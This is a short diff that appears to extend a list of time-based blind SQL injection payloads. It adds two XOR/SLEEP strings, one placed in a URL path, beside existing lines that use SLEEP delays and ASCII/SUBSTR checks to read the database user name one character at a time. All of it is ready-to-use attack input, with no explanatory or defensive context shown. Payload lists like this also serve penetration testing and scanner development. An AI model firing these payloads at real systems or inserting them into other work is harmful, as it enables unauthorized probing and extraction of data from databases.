@@ -11,3 +11,5 @@ id=1),1,1)='a', SLEEP(5),0)
 ' OR IF(ASCII(SUBSTR(user(),1,1))=114,SLEEP(5),0)--
 "id":"56456 AND sleep(15)#"
 (select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)
+‘XOR(if(now()=sysdate(),sleep(8),0))XOR’111
+/page/‘XOR(if(now()=sysdate(),sleep(8),0))XOR’111/test.test
